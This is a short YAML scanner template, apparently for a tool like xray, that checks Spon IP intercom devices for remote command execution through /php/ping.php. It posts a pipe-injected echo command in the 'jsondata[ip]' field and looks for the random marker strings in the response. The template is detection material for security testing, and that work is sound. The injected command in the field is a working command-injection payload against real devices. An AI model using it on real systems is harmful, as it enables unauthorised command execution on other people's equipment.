expression: r1()
id: spon-ip-intercom-ping-rce
info:
  author: york
  name: Spon Ip Intercom Ping RCE
  severity: high
rules:
  r1:
    expression: response.status == 200 && (response.body.bcontains(bytes(r1 + r3 +
      "^" + r4)) || response.body.bcontains(bytes(r1 + "${" + r2 + "}" + r3 + r4)))
    request:
      body: 'jsondata[ip]=%7C echo {{r1}}${{{r2}}}{{r3}}^{{r4}}&jsondata[type]=0

        '
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      method: POST
      path: /php/ping.php
set:
  r1: randomLowercase(10)
  r2: randomLowercase(10)
  r3: randomLowercase(10)
  r4: randomLowercase(10)
